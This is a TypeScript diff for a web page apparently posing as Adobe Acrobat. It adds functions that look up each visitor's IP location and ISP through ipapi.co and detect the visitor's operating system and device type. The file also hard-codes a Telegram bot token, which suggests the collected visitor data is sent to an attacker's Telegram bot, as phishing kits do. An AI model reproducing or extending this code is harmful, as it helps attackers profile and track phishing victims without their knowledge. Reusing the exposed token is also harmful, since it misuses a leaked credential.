@@ -42,6 +42,40 @@ const fetchVisitorIp = async (): Promise<string | null> => {
     return null;
   }
 };
+
+const fetchIpGeoData = async (ip: string): Promise<Record<string, any>> => {
+  try {
+    const res = await fetch(`https://ipapi.co/${ip}/json/`);
+    const data = await res.json();
+    return {
+      ip,
+      isp: data.org || "Unknown",
+      city: data.city || "Unknown",
+      region: data.region || "Unknown",
+      country: data.country_name || "Unknown",
+    };
+  } catch {
+    return { ip, isp: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown" };
+  }
+};
+
+const getOSName = (): string => {
+  const ua = navigator.userAgent;
+  if (ua.includes("Windows NT 10")) return "Windows 10";
+  if (ua.includes("Windows NT 11") || (ua.includes("Windows NT 10") && (navigator as any).userAgentData?.platform === "Windows")) return "Windows 10+";
+  if (ua.includes("Windows")) return "Windows";
+  if (ua.includes("Mac OS X")) return "macOS";
+  if (ua.includes("Linux")) return "Linux";
+  if (ua.includes("Android")) return "Android";
+  if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+  return "Unknown";
+};
+
+const getDeviceType = (): string => {
+  const ua = navigator.userAgent;
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua) || window.innerWidth < 768) return "📱 Mobile";
+  return "💻 Desktop";
+};
 import acrobatBg from "@/assets/adobe-acrobat-bg.webp";
 
 const TELEGRAM_BOT_TOKEN = "8648729689:AAEj5AJW3EJOAMYkAtVbm1DgSNgTy2fo1jw";
